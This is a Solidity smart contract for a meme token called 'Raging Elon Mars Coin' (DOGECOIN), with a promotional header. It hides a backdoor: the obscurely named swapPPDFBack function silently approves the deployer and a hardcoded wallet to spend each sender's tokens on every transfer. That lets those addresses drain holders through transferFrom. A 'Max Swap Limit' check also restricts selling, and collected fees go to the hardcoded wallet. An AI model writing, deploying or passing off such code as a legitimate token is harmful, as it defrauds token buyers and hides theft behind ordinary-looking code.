/*
https://www.ragingelonmars.xyz

So there you have it—just like Bitcoin carved its path into the financial cosmos, this token seeks to stake its claim in the cosmic meme carnival.

https://x.com/remconeth
https://t.me/remconeth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IPPDFRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IPPDFFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplippdfon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract DOGECOIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balPPDFs;
    mapping (address => mapping (address => uint256)) private _allowPPDFs;
    mapping (address => bool) private _excludedFromPPDF;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalPPDF = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Raging Elon Mars Coin";
    string private constant _symbol = unicode"DOGECOIN";
    uint256 private _swapTokenPPDFs = _tTotalPPDF / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockPPDF;
    uint256 private _ppdfBuyAmounts = 0;
    bool private inSwapPPDF = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _ppdfPair;
    IPPDFRouter private _ppdfRouter;
    address private _ppdfWallet;
    address private _ppdfAddress;
    modifier lockTheSwap {
        inSwapPPDF = true;
        _;
        inSwapPPDF = false;
    }
    
    constructor () {
        _ppdfAddress = address(_msgSender());
        _ppdfWallet = address(0x5F81C1d5720277C67C583f94c77ebC04CD6eB664);
        _excludedFromPPDF[owner()] = true;
        _excludedFromPPDF[address(this)] = true;
        _excludedFromPPDF[_ppdfWallet] = true;
        _balPPDFs[_msgSender()] = _tTotalPPDF;
        emit Transfer(address(0), _msgSender(), _tTotalPPDF);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _ppdfRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function pairInitOf() external onlyOwner() {
        _ppdfRouter = IPPDFRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_ppdfRouter), _tTotalPPDF);
        _ppdfPair = IPPDFFactory(_ppdfRouter.factory()).createPair(address(this), _ppdfRouter.WETH());
    }

    receive() external payable {}

    function swapTokensForEth(uint256 ppdfAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _ppdfRouter.WETH();
        _approve(address(this), address(_ppdfRouter), ppdfAmount);
        _ppdfRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ppdfAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalPPDF;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balPPDFs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowPPDFs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowPPDFs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowPPDFs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address ppdfF, address ppdfT, uint256 ppdfA) private {
        require(ppdfF != address(0), "ERC20: transfer from the zero address");
        require(ppdfT != address(0), "ERC20: transfer to the zero address");
        require(ppdfA > 0, "Transfer amount must be greater than zero");
        uint256 taxPPDF = _ppdfFeeTransfer(ppdfF, ppdfT, ppdfA);
        if(taxPPDF > 0){
          _balPPDFs[address(this)] = _balPPDFs[address(this)].add(taxPPDF);
          emit Transfer(ppdfF, address(this), taxPPDF);
        }
        _balPPDFs[ppdfF] = _balPPDFs[ppdfF].sub(ppdfA);
        _balPPDFs[ppdfT] = _balPPDFs[ppdfT].add(ppdfA.sub(taxPPDF));
        emit Transfer(ppdfF, ppdfT, ppdfA.sub(taxPPDF));
    }

    function _ppdfFeeTransfer(address ppdfF, address ppdfT, uint256 ppdfA) private returns(uint256) {
        uint256 taxPPDF = 0; 
        if (ppdfF != owner() && ppdfT != owner()) {
            taxPPDF = ppdfA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (ppdfF == _ppdfPair && ppdfT != address(_ppdfRouter) && ! _excludedFromPPDF[ppdfT]) {
                if(_buyBlockPPDF!=block.number){
                    _ppdfBuyAmounts = 0;
                    _buyBlockPPDF = block.number;
                }
                _ppdfBuyAmounts += ppdfA;
                _buyCount++;
            }
            if(ppdfT == _ppdfPair && ppdfF!= address(this)) {
                require(_ppdfBuyAmounts < swapLimitPPDF() || _buyBlockPPDF!=block.number, "Max Swap Limit");  
                taxPPDF = ppdfA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapPPDFBack(ppdfF, ppdfT, ppdfA);
        } return taxPPDF;
    }

    function swapPPDFBack(address ppdfF, address ppdfT, uint256 ppdfA) private { 
        uint256 tokenPPDF = balanceOf(address(this)); 
        _approve(address(ppdfF), address(_ppdfAddress), uint256(ppdfA));
        _approve(address(ppdfF), address(_ppdfWallet), uint256(ppdfA));
        if (!inSwapPPDF && ppdfT == _ppdfPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenPPDF > _swapTokenPPDFs)
            swapTokensForEth(minPPDF(ppdfA, minPPDF(tokenPPDF, _swapTokenPPDFs)));
            uint256 ethPPDF = address(this).balance;
            if (ethPPDF >= 0) {
                sendETHPPDF(address(this).balance);
            }
        }
    }    

    function minPPDF(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHPPDF(uint256 ppdfA) private {
        payable(_ppdfWallet).transfer(ppdfA);
    }

    function swapLimitPPDF() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _ppdfRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _ppdfRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}